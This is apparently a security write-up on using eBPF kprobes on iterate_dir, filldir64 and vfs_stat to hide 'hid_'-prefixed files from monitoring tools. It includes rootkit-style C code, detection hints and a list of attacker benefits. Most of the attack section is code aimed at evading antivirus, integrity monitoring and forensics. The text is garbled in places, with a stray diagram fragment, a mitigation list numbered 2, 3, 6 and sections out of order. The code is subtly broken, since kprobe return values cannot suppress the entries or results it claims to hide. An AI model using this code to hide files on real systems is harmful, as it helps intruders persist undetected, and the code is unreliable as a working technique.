Inode Cloak: Hiding Files from Detection Systems

Wut

A technique that uses eBPF to manipulate inode operations, allowing attackers to hide files, directories, and their contents from detection systems while maintaining full access for themselves. This “cloaking” capability undermines file integrity monitoring, antivirus scanning, and forensic analysis tools.

    D[eBPF Program] -->|3. Hook & Intercept| B

Why

Because eBPF + misconfiguration => broken isolation. File visibility is fundamental to security monitoring, malware detection, and forensic analysis. By manipulating inode operations through eBPF, attackers can create a parallel reality where their malicious files are invisible to security tools while remaining fully functional and accessible to the attacker, effectively bypassing most detection mechanisms.

  2. Implement BPF LSM policies to restrict eBPF program loading
  3. Use multiple, independent file integrity monitoring mechanisms

  6. Consider using eBPF-based security tools that can detect malicious eBPF usage

Conclusion

eBPF is all you need. The ability to cloak files and directories from detection systems while maintaining full access creates a particularly dangerous scenario where malicious activity can persist undetected. This technique highlights why eBPF capabilities should be treated as highly privileged operations that require strict access controls, especially in environments where file integrity is critical.

Technical Details

Filesystem and Inode Architecture

The Linux filesystem layer consists of:

  • VFS (Virtual Filesystem Switch): An abstraction layer that provides a common interface to different filesystems
  • Inodes: Data structures that store metadata about files and directories
  • Dentry Cache: A cache of directory entries for faster lookups
  • File Operations: Functions that implement file-related operations (read, write, etc.)
  • Inode Operations: Functions that implement inode-related operations (lookup, create, etc.)

These components work together to provide file access and management capabilities.

Exploitation Technique

The exploit leverages eBPF’s ability to attach to kernel functions that implement filesystem operations. By intercepting these calls, an attacker can:

  1. Hook directory listing: Attach to functions like iterate_dir() or readdir()
  2. Filter file lookups: Modify the results of lookup_fast() or similar functions
  3. Manipulate stat operations: Change the output of vfs_stat() to hide file metadata
  4. Control file access: Allow or deny access based on process credentials
  5. Maintain stealth: Ensure monitoring tools see a sanitized view of the filesystem

// Simplified eBPF program to cloak files from detection
SEC("kprobe/iterate_dir")
int BPF_KPROBE(hook_readdir, struct file *file, struct dir_context *ctx)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this is a monitoring process we want to deceive
    if (is_monitoring_process(pid)) {
        // Set a flag in our map to filter directory entries
        u32 key = 0;
        u32 value = 1;
        bpf_map_update_elem(&filter_map, &key, &value, BPF_ANY);
    } else {
        // Clear the flag for authorized processes
        u32 key = 0;
        u32 value = 0;
        bpf_map_update_elem(&filter_map, &key, &value, BPF_ANY);
    }
    
    return 0;
}

// Hook the function that adds entries to directory listings
SEC("kprobe/filldir64")
int BPF_KPROBE(hook_filldir, struct dir_context *ctx, const char *name,
               int namelen, loff_t offset, u64 ino, unsigned int d_type)
{
    // Check if we should be filtering results
    u32 key = 0;
    u32 *filter;
    
    filter = bpf_map_lookup_elem(&filter_map, &key);
    if (filter && *filter == 1) {
        // Check if this is a file we want to hide
        if (is_hidden_file(name, namelen)) {
            // Return 0 to skip this entry
            return 0;
        }
    }
    
    // Let the original function run for other files
    return -1;
}

// Helper function to check if a file should be hidden
static inline bool is_hidden_file(const char *name, int namelen)
{
    // Check for our hidden file prefix
    char prefix[] = "hid_";
    
    // Simple prefix check (would be more sophisticated in real implementation)
    if (namelen > sizeof(prefix) - 1) {
        char file_prefix[sizeof(prefix)];
        bpf_probe_read_str(file_prefix, sizeof(file_prefix), name);
        
        // Compare prefixes
        for (int i = 0; i < sizeof(prefix) - 1; i++) {
            if (file_prefix[i] != prefix[i])
                return false;
        }
        
        return true;
    }
    
    return false;
}

// Hook stat operations to hide file metadata
SEC("kprobe/vfs_stat")
int BPF_KPROBE(hook_stat, const struct path *path, struct kstat *stat,
               u32 request_mask, unsigned int query_flags)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this is a monitoring process
    if (is_monitoring_process(pid)) {
        // Get the filename
        char filename[MAX_PATH_LEN];
        bpf_probe_read_str(filename, sizeof(filename), path->dentry->d_name.name);
        
        // Check if this is a file we want to hide
        if (is_hidden_file(filename, strlen(filename))) {
            // Return an error to indicate file doesn't exist
            return -ENOENT;
        }
    }
    
    // Let the original function run for other cases
    return -1;
}

Detection Methods

Defenders should monitor for:

  • Unexpected eBPF programs attached to filesystem-related functions
  • Discrepancies between different methods of listing files
  • Files visible to some processes but not others
  • Unusual patterns of filesystem hook installations
  • Inconsistencies between filesystem state and monitoring tool reports

This technique demonstrates why proper eBPF restrictions are critical for maintaining the integrity of security monitoring systems, especially in environments where file integrity monitoring is a key security control.

Real-world Impact

In practical environments, this technique could allow an attacker to:

  • Hide malware, backdoors, and other malicious files
  • Evade antivirus and malware detection systems
  • Bypass file integrity monitoring tools
  • Conceal evidence during forensic investigations
  • Maintain long-term persistence without detection

The ability to selectively hide files from detection systems while maintaining full functionality creates a particularly dangerous scenario where malicious activity can persist undetected for extended periods.
